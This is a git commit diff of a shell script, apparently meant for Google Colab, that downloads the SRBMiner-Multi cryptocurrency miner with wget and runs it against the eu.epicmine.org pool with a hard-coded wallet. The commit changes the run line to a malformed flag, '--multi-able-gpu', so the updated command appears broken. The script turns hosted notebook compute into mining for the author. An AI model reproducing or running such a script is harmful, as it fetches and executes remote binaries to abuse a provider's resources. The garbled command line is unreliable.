22e9af701376df92a24dc539c53f5515117c54c4
seedboxtuga <89316920+seedboxtuga@users.noreply.github.com>
2022-04-27 22:42:02 -0300

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -11,4 +11,4 @@ sudo apt install screen
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.4/SRBMiner-Multi-0-9-4-Linux.tar.xz
 tar -xf SRBMiner-Multi-0-9-4-Linux.tar.xz
 cd SRBMiner-Multi-0-9-4
-./SRBMiner-MULTI --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool eu.epicmine.org:3334 --tls true --wallet ruph06.worker_console --password 12345678m=pool --keepalive true
+./SRBMiner-MULTI --multi-able-gpu --algorithm randomepic --pool eu.epicmine.org:3334 --tls true --wallet ruph06.worker_console --password 12345678m=pool --keepalive true
